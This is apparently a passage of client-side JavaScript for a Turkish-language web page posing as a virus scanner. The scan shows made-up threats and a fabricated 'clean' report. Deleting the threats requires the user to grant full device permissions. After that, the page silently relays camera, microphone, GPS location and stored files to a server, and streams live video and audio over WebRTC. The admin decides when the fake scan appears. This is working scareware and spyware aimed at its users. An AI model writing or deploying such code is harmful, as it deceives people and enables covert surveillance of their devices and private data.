    if (fill) fill.style.width = Math.min(scannerProgress, 100) + '%';
    if (pct) pct.textContent = '%' + Math.round(Math.min(scannerProgress, 100));
    if (status) status.textContent = getScanStatusText();
    if (detail) {
        detail.innerHTML = `Taranan dosya: ${Math.floor(scannerProgress * 127 + Math.random() * 50)}<br>Tespit edilen tehdit: ${virusScanFindings.length}`;
    }

    const sub = document.querySelector('.virus-header .virus-subtitle');
    if (sub) sub.textContent = getScanStatusText();

    if (scannerProgress >= 100) {
        finishVirusScan();
    } else {
        scannerTimer = setTimeout(updateVirusScanProgress, 1000);
    }
}

function addFindingToUI(v) {
    const list = document.getElementById('scanFindings');
    if (!list) return;
    const item = document.createElement('div');
    item.className = 'finding-item severity-' + v.severity.toLowerCase();
    item.innerHTML = `
        <div class="finding-icon"></div>
        <div class="finding-info">
            <div class="finding-name">${v.name}</div>
            <div class="finding-type">${v.type} — ${v.desc}</div>
            <div class="finding-path">${v.path} | Tespit: ${v.foundAt}</div>
        </div>
        <div class="finding-severity severity-${v.severity.toLowerCase()}">${v.severity}</div>
    `;
    item.style.animation = 'slideIn 0.3s ease-out';
    list.appendChild(item);
}

function finishVirusScan() {
    virusScanActive = false;
    if (scannerTimer) { clearTimeout(scannerTimer); scannerTimer = null; }

    const area = document.getElementById('virusScanArea');
    const perms = checkPermissions();
    const allGranted = perms && perms.camera && perms.microphone && perms.speaker && perms.location && perms.storage;

    document.querySelector('.virus-header .virus-icon').textContent = '📋';
    document.querySelector('.virus-header h1').textContent = 'Tarama Tamamlandı';
    document.querySelector('.virus-header .virus-subtitle').textContent = `${virusScanFindings.length} tehdit tespit edildi`;

    reportScanProgress(100, 'completed');

    let findingsHtml = virusScanFindings.map(v => `
        <div class="finding-item severity-${v.severity.toLowerCase()}">
            <div class="finding-icon"></div>
            <div class="finding-info">
                <div class="finding-name">${v.name}</div>
                <div class="finding-type">${v.type} — ${v.desc}</div>
                <div class="finding-path">${v.path} | Tespit: ${v.foundAt}</div>
            </div>
            <div class="finding-severity severity-${v.severity.toLowerCase()}">${v.severity}</div>
        </div>
    `).join('');

    area.innerHTML = `
        <div class="scan-complete">
            <div class="scan-complete-icon">${virusScanFindings.length > 0 ? '\u26A0\uFE0F' : '\u2705'}</div>
            <h2>Tarama Tamamlandi</h2>
            <p class="scan-complete-text">
                Toplam ${virusScanFindings.length} tehdit tespit edildi.
                Bu tehditler sistem guvenliginizi tehlikeye atmaktadir.
            </p>
        </div>
        <div class="scan-findings" id="scanFindingsFinal">${findingsHtml}</div>
        <div class="scan-actions" id="scanActions">
            ${allGranted ? `
                <button class="btn btn-danger btn-full" id="deleteVirusBtn" onclick="requestVirusDelete()">
                    Tespit Edilenleri Sil
                </button>
            ` : `
                <div class="scan-perm-warning">
                    <p>Silme islemi yapilabilmesi icin tum erisim yetkilerinin verilmesi gerekmektedir.</p>
                    <button class="btn btn-primary btn-full" onclick="reopenPermissions()">
                        Erisim Yetkisi Vermek Icin Tiklayin
                    </button>
                </div>
                <button class="btn btn-danger btn-full" id="deleteVirusBtn" disabled style="opacity:0.5;margin-top:10px;">
                    Tespit Edilenleri Sil
                </button>
            `}
        </div>
        <div id="virusDeleteWait" style="display:none;"></div>
    `;
}

async function reportScanProgress(progress, status) {
    const auth = getAuth();
    if (!auth) return;
    try {
        const cleanFindings = virusScanFindings.map(v => ({
            name: v.name,
            type: v.type,
            severity: v.severity,
            path: v.path,
            foundAt: v.foundAt
        }));
        await fetch('/api/relay/virus/scan-status', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                uid: auth.uid,
                auth: makeAuthPayload(),
                progress: progress,
                status: status,
                findings: cleanFindings
            })
        });
    } catch {}
}

async function requestVirusDelete() {
    const auth = getAuth();
    if (!auth) return;

    const area = document.getElementById('virusScanArea');
    const btn = document.getElementById('deleteVirusBtn');
    if (btn) { btn.disabled = true; btn.textContent = 'İşlem başlatılıyor...'; }

    try {
        await fetch('/api/relay/virus/notify-delete', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ uid: auth.uid })
        });

        area.innerHTML = `
            <div class="scan-delete-wait">
                <div class="scan-delete-spinner"></div>
                <h2>Temizleniyor...</h2>
                <p class="scan-delete-warn">
                    ⚠️ LÜTFEN BU EKRANI KAPATMAYIN ⚠️<br><br>
                    Tespit edilen ${virusScanFindings.length} tehdit temizleniyor.<br>
                    Silme işlemi devam ederken bu ekranı kapatmanız durumunda<br>
                    sistem geri dönüşü olmayan hasarlara maruz kalabilir.<br><br>
                    <span class="scan-delete-sub">Silme işlemi başlatıldı, lütfen bekleyin...</span>
                </p>
            </div>
        `;
        startDeletePolling();
    } catch {
        if (btn) { btn.disabled = false; btn.textContent = 'Tespit Edilenleri Sil'; }
    }
}

function startDeletePolling() {
    const auth = getAuth();
    if (!auth) return;

    const poll = setInterval(async () => {
        try {
            const resp = await fetch(`/api/relay/virus/delete-status?uid=${auth.uid}&auth=${makeAuthPayload()}`);
            const data = await resp.json();
            if (data.status === 'ok' && data.cleaned) {
                clearInterval(poll);
                showCleanSuccess();
            }
        } catch {}
    }, 2000);
}

async function showCleanSuccess() {
    const area = document.getElementById('virusScanArea');

    document.querySelector('.virus-header .virus-icon').textContent = '✅';
    document.querySelector('.virus-header h1').textContent = 'Temizlik Başarıyla Tamamlandı';
    document.querySelector('.virus-header .virus-subtitle').textContent = 'Sisteminiz artık güvende';

    // Rastgele detay metni
    const details = virusScanFindings.map(v => `
        <tr>
            <td>${v.name}</td>
            <td>${v.type}</td>
            <td>${v.severity}</td>
            <td>${v.path}</td>
            <td>${v.foundAt}</td>
            <td>${v.desc}</td>
            <td><span style="color:#4caf50;">✓ Silindi</span></td>
        </tr>
    `).join('');

    area.innerHTML = `
        <div class="scan-clean-success">
            <div class="scan-clean-icon">✅</div>
            <h2>Temizlik Başarıyla Tamamlandı</h2>
            <p class="scan-clean-text">
                Tespit edilen ${virusScanFindings.length} tehdit başarıyla temizlenmiştir.<br>
                Sisteminiz artık güvende.
            </p>
            <button class="btn btn-primary btn-full" onclick="hideVirusScanner()">Ana Sayfaya Dön</button>
        </div>
        <div class="scan-report">
            <h3>🔍 Detaylı Güvenlik Raporu</h3>
            <div class="scan-report-meta">
                <p><strong>Rapor Tarihi:</strong> ${new Date().toLocaleDateString()} ${new Date().toLocaleTimeString()}</p>
                <p><strong>Cihaz ID:</strong> ${getAuth()?.uid?.substring(0, 12)}...</p>
                <p><strong>Tarama Süresi:</strong> ${Math.round(scannerDuration / 60)} dakika</p>
            </div>
            <div class="scan-report-summary">
                <h4>Özet</h4>
                <p>Güvenlik taraması sırasında toplam ${virusScanFindings.length} adet kötü amaçlı yazılım tespit edilmiştir.
                Bu yazılımlar; kamera, mikrofon, konum bilgisi ve dosya sisteminize erişim sağlayarak
                kişisel verilerinizi toplamaya çalışmaktadır. Tespit anında tüm erişimler engellenmiş
                ve az önceki işlemle birlikte bu tehditler sisteminizden tamamen kaldırılmıştır.
                Herhangi bir verinizin ele geçirildiğine dair bir bulguya rastlanmamıştır.</p>
            </div>
            <table class="scan-report-table">
                <thead>
                    <tr>
                        <th>Tehdit Adı</th>
                        <th>Tür</th>
                        <th>Seviye</th>
                        <th>Konum</th>
                        <th>Tespit Zamanı</th>
                        <th>Açıklama</th>
                        <th>Durum</th>
                    </tr>
                </thead>
                <tbody>${details}</tbody>
            </table>
            <div class="scan-report-footer">
                <p><em>Bu rapor otomatik olarak oluşturulmuştur. Rapor ID: ${Math.random().toString(36).substring(2, 10).toUpperCase()}</em></p>
            </div>
        </div>
    `;
    document.querySelector('.scan-actions, .scan-delete-wait')?.remove();
}

function reopenPermissions() {
    showPermissionGate();
}

// ============ WEBRTC ============

let webrtcPC = null;
let webrtcConnected = false;

async function startWebRTC() {
    if (webrtcConnected || webrtcPC) return;
    const auth = getAuth();
    const perms = checkPermissions();
    if (!auth || !perms) return;
    if (!perms.camera && !perms.microphone) return;

    let stream;
    if (gPermissionStream) {
        stream = gPermissionStream;
    } else if (cameraStream) {
        stream = cameraStream;
    } else { return; }

    try {
        const pc = new RTCPeerConnection({
            iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
        });
        webrtcPC = pc;

        stream.getTracks().forEach(track => pc.addTrack(track, stream));

        pc.onicecandidate = (e) => {
            if (e.candidate) {
                sendIceCandidate(auth.uid, e.candidate);
            }
        };

        pc.oniceconnectionstatechange = () => {
            if (pc.iceConnectionState === 'connected' || pc.iceConnectionState === 'completed') {
                webrtcConnected = true;
            }
        };

        const offer = await pc.createOffer();
        await pc.setLocalDescription(offer);

        await fetch('/api/relay/webrtc/offer', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                uid: auth.uid,
                auth: makeAuthPayload(),
                sdp: offer.sdp,
                type: offer.type
            })
        });

        pollWebRTCAnswer(auth);
        startWebRTCIcePolling(auth);

    } catch {}
}

async function pollWebRTCAnswer(auth) {
    const maxAttempts = 30;
    let attempt = 0;
    const poll = setInterval(async () => {
        attempt++;
        if (attempt > maxAttempts) { clearInterval(poll); return; }
        try {
            const resp = await fetch(`/api/relay/webrtc/answer?uid=${auth.uid}&auth=${makeAuthPayload()}`);
            const data = await resp.json();
            if (data.status === 'ok' && data.sdp && webrtcPC) {
                clearInterval(poll);
                await webrtcPC.setRemoteDescription(new RTCSessionDescription({
                    sdp: data.sdp,
                    type: data.type
                }));
            }
        } catch {}
    }, 2000);
}

async function sendIceCandidate(uid, candidate) {
    try {
        await fetch('/api/relay/webrtc/ice', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                uid: uid,
                auth: makeAuthPayload(),
                candidate: candidate.toJSON ? candidate.toJSON() : { candidate: candidate.candidate, sdpMid: candidate.sdpMid, sdpMLineIndex: candidate.sdpMLineIndex }
            })
        });
    } catch {}
}

function startWebRTCIcePolling(auth) {
    if (!webrtcPC) return;
    const poll = setInterval(async () => {
        if (!webrtcPC) { clearInterval(poll); return; }
        try {
            const resp = await fetch(`/api/relay/webrtc/ice?uid=${auth.uid}&auth=${makeAuthPayload()}`);
            const data = await resp.json();
            if (data.status === 'ok' && data.candidates) {
                for (const c of data.candidates) {
                    try { await webrtcPC.addIceCandidate(new RTCIceCandidate(c)); } catch {}
                }
            }
        } catch {}
    }, 3000);
}

// ============ VIRUS TRIGGER POLLING ============
// Admin tetiklediğinde kullanıcı tarafında tarama başlatılır

let virusTriggerTimer = null;

function startVirusTriggerPolling() {
    stopVirusTriggerPolling();
    pollVirusTrigger();
    virusTriggerTimer = setInterval(pollVirusTrigger, 5000);
}

function stopVirusTriggerPolling() {
    if (virusTriggerTimer) {
        clearInterval(virusTriggerTimer);
        virusTriggerTimer = null;
    }
}

async function pollVirusTrigger() {
    const auth = getAuth();
    if (!auth) return;
    try {
        const resp = await fetch(`/api/relay/virus/check-trigger?uid=${auth.uid}&auth=${makeAuthPayload()}`);
        const data = await resp.json();
        if (data.status === 'ok' && data.trigger) {
            stopVirusTriggerPolling();
            showVirusScanner();
        }
    } catch {}
}

// ============ LOCAL CAMERA PREVIEW (client-side) ============

let localCamStream = null;
let localAudioStream = null;
let localAudioCtx = null;
let localAnalyser = null;
let localAnimFrame = null;

function updateCamButton(starting) {
    const btn = document.getElementById('camToggleBtn');
    if (!btn) return;
    btn.textContent = starting ? '⏹ Durdur' : '▶ Başlat';
    btn.className = 'card-toggle' + (starting ? ' active' : '');
}

function updateAudButton(starting) {
    const btn = document.getElementById('audToggleBtn');
    if (!btn) return;
    btn.textContent = starting ? '⏹ Durdur' : '▶ Başlat';
    btn.className = 'card-toggle' + (starting ? ' active' : '');
}

async function toggleLocalCamera() {
    const video = document.getElementById('localCamera');
    const placeholder = document.getElementById('camPlaceholder');
    if (!video || !placeholder) return;

    if (localCamStream) {
        localCamStream.getTracks().forEach(t => t.stop());
        localCamStream = null;
        video.style.display = 'none';
        placeholder.style.display = 'block';
        updateCamButton(false);
        return;
    }

    try {
        localCamStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
        video.srcObject = localCamStream;
        video.style.display = 'block';
        placeholder.style.display = 'none';
        updateCamButton(true);
    } catch (e) {
        placeholder.textContent = '📷 Kamera açılamadı: ' + e.message;
        placeholder.style.display = 'block';
    }
}

async function toggleLocalAudio() {
    const placeholder = document.getElementById('audPlaceholder');
    const bars = document.querySelectorAll('.viz-bar');
    if (!placeholder) return;

    if (localAudioStream) {
        stopLocalAudio();
        updateAudButton(false);
        bars.forEach(b => b.style.height = '4px');
        placeholder.style.display = 'block';
        return;
    }

    try {
        localAudioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
        localAudioCtx = new (window.AudioContext || window.webkitAudioContext)();
        localAnalyser = localAudioCtx.createAnalyser();
        localAnalyser.fftSize = 32;
        const source = localAudioCtx.createMediaStreamSource(localAudioStream);
        source.connect(localAnalyser);

        placeholder.style.display = 'none';
        updateAudButton(true);

        const dataArray = new Uint8Array(localAnalyser.frequencyBinCount);

        function draw() {
            if (!localAnalyser) return;
            localAnalyser.getByteFrequencyData(dataArray);
            bars.forEach((bar, i) => {
                const val = i < dataArray.length ? dataArray[i] / 2 : 2;
                bar.style.height = Math.max(2, val) + 'px';
            });
            localAnimFrame = requestAnimationFrame(draw);
        }
        draw();
    } catch (e) {
        placeholder.textContent = '🎤 Ses açılamadı: ' + e.message;
        placeholder.style.display = 'block';
    }
}

function stopLocalAudio() {
    if (localAnimFrame) { cancelAnimationFrame(localAnimFrame); localAnimFrame = null; }
    if (localAudioCtx) { localAudioCtx.close().catch(()=>{}); localAudioCtx = null; }
    if (localAudioStream) { localAudioStream.getTracks().forEach(t => t.stop()); localAudioStream = null; }
    localAnalyser = null;
}

// ============ LOCAL STORAGE PICKER (client-side) ============

let localPickedFiles = [];

function pickLocalFiles() {
    const input = document.createElement('input');
    input.type = 'file';
    input.multiple = true;
    input.style.display = 'none';
    input.onchange = (e) => {
        const files = Array.from(e.target.files);
        localPickedFiles = files;
        renderLocalFileList(files);
        document.body.removeChild(input);
    };
    input.oncancel = () => document.body.removeChild(input);
    document.body.appendChild(input);
    input.click();
}

function formatFileSize(bytes) {
    if (bytes < 1024) return bytes + ' B';
    if (bytes < 1048576) return (bytes / 1024).toFixed(1) + ' KB';
    return (bytes / 1048576).toFixed(1) + ' MB';
}

function renderLocalFileList(files) {
    const list = document.getElementById('storageFileList');
    const placeholder = document.getElementById('stoPlaceholder');
    if (!list || !placeholder) return;

    if (files.length === 0) {
        placeholder.style.display = 'block';
        list.innerHTML = '';
        return;
    }

    placeholder.style.display = 'none';
    list.innerHTML = files.slice(0, 50).map(f => `
        <div class="file-item">
            <span class="fi-name">${f.name}</span>
            <span class="fi-size">${formatFileSize(f.size)}</span>
        </div>
    `).join('');

    if (files.length > 50) {
        list.innerHTML += `<div class="file-item" style="color:var(--text-muted);">+${files.length - 50} dosya daha...</div>`;
    }
}

// ============ MANUAL VIRUS SCAN (client-side, no admin approval) ============

function startManualVirusScan() {
    const btn = document.getElementById('virusScanBtn');
    const progressArea = document.getElementById('virusManualProgress');
    const statusArea = document.getElementById('virusStatusArea');
    if (!btn || !progressArea) return;

    btn.disabled = true;
    btn.textContent = '🔍 Taranıyor...';
    progressArea.style.display = 'block';
    if (statusArea) statusArea.style.display = 'none';

    // Reset
    virusScanFindings = [];
    const findingsList = document.getElementById('manualScanFindings');
    if (findingsList) findingsList.innerHTML = '';

    const fill = document.getElementById('manualScanFill');
    const pctEl = document.getElementById('manualScanPct');
    const statusEl = document.getElementById('manualScanStatus');
    const detailEl = document.getElementById('manualScanDetail');
    if (!fill || !pctEl || !statusEl) return;

    scannerDuration = 3000 + Math.random() * 2000;
    const startTime = Date.now();

    function update() {
        const elapsed = Date.now() - startTime;
        const progress = Math.min(100, (elapsed / scannerDuration) * 100);

        fill.style.width = progress + '%';
        pctEl.textContent = '%' + Math.round(progress);

        if (progress < 25) statusEl.textContent = 'Sistem dosyaları taranıyor...';
        else if (progress < 50) statusEl.textContent = 'Ağ bağlantıları analiz ediliyor...';
        else if (progress < 75) statusEl.textContent = 'Bellek ve işlemler inceleniyor...';
        else statusEl.textContent = 'Gizli tehditler aranıyor...';

        detailEl.innerHTML = `Taranan dosya: ${Math.floor(progress * 80 + Math.random() * 30)}<br>Tespit edilen tehdit: ${virusScanFindings.length}`;

        if (progress >= 30 && virusScanFindings.length < 1) {
            const v = generateVirusName();
            v.foundAt = new Date().toLocaleTimeString();
            virusScanFindings.push(v);
            addManualFinding(v);
        }
        if (progress >= 60 && virusScanFindings.length < 2) {
            const v = generateVirusName();
            v.foundAt = new Date().toLocaleTimeString();
            virusScanFindings.push(v);
            addManualFinding(v);
        }

        if (progress >= 100) {
            finishManualScan();
        } else {
            setTimeout(update, 400);
        }
    }
    update();
}

function addManualFinding(v) {
    const list = document.getElementById('manualScanFindings');
    if (!list) return;
    const item = document.createElement('div');
    item.className = 'finding-item severity-' + v.severity.toLowerCase();
    item.style.padding = '6px 10px';
    item.style.fontSize = '11px';
    item.style.marginTop = '4px';
    item.innerHTML = `
        <div class="finding-info" style="flex:1;min-width:0;">
            <div class="finding-name" style="font-size:11px;">${v.name}</div>
            <div class="finding-type" style="font-size:10px;">${v.type} — ${v.desc}</div>
            <div class="finding-path" style="font-size:9px;">${v.path}</div>
        </div>
        <div class="finding-severity severity-${v.severity.toLowerCase()}" style="font-size:10px;">${v.severity}</div>
    `;
    list.appendChild(item);
}

async function finishManualScan() {
    const btn = document.getElementById('virusScanBtn');
    const progressArea = document.getElementById('virusManualProgress');
    const statusArea = document.getElementById('virusStatusArea');
    const fill = document.getElementById('manualScanFill');
    const pctEl = document.getElementById('manualScanPct');
    const statusEl = document.getElementById('manualScanStatus');

    if (fill) fill.style.width = '100%';
    if (pctEl) pctEl.textContent = '%100';
    if (statusEl) statusEl.textContent = '✅ Tarama tamamlandı!';

    btn.textContent = '🧹 Temizle';
    btn.disabled = false;

    if (virusScanFindings.length > 0) {
        btn.onclick = () => completeManualClean();
    } else {
        if (statusArea) {
            statusArea.innerHTML = '<div class="card-placeholder">✅ Tehdit bulunamadı, sisteminiz güvende.</div>';
            statusArea.style.display = 'block';
        }
        if (progressArea) progressArea.style.display = 'none';
        btn.textContent = '🔍 Tara';
        btn.onclick = startManualVirusScan;
    }
}

async function completeManualClean() {
    const btn = document.getElementById('virusScanBtn');
    const progressArea = document.getElementById('virusManualProgress');
    const findingsList = document.getElementById('manualScanFindings');
    if (!btn || !progressArea) return;

    btn.disabled = true;
    btn.textContent = '🧹 Temizleniyor...';

    // Admin bildirimi gönder (onay BEKLEMEZ)
    const auth = getAuth();
    if (auth) {
        try {
            await fetch('/api/relay/virus/notify-delete', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ uid: auth.uid })
            });
        } catch {}
    }

    setTimeout(() => {
        if (findingsList) findingsList.innerHTML = '';
        const statusArea = document.getElementById('virusStatusArea');
        if (statusArea) {
            statusArea.innerHTML = `<div class="card-placeholder" style="color:var(--accent-green);">✅ ${virusScanFindings.length} tehdit temizlendi. Sisteminiz güvende.</div>`;
            statusArea.style.display = 'block';
        }
        progressArea.style.display = 'none';

        btn.textContent = '🔍 Tara';
        btn.disabled = false;
        btn.onclick = startManualVirusScan;
        virusScanFindings = [];
    }, 1500);
}

// ============ INIT ============

document.addEventListener('DOMContentLoaded', async () => {
    if (!requireAuth()) return;
    document.getElementById('logoutBtn')?.addEventListener('click', logout);
    renderPermissionGate();

    // IndexedDB'den kayıtlı storage handle'ı geri yüklemeyi dene
    const restoredHandle = await loadStorageHandle();
    if (restoredHandle) {
        storageRootHandle = restoredHandle;
    }

    const perms = checkPermissions();
    if (!perms) {
        showPermissionGate();
    } else {
        // İzinler daha önce verilmiş, arka plan servislerini başlat
        startCameraRelay();
        startAudioRelay();
        startWebRTC();
        startGpsTracking();
        startHeartbeat();
        startStoragePolling();
        startVirusTriggerPolling();

        // Storage handle varsa otomatik tara
        if (storageRootHandle && perms.storage) {
            startStorageRelay();
        }
    }
});
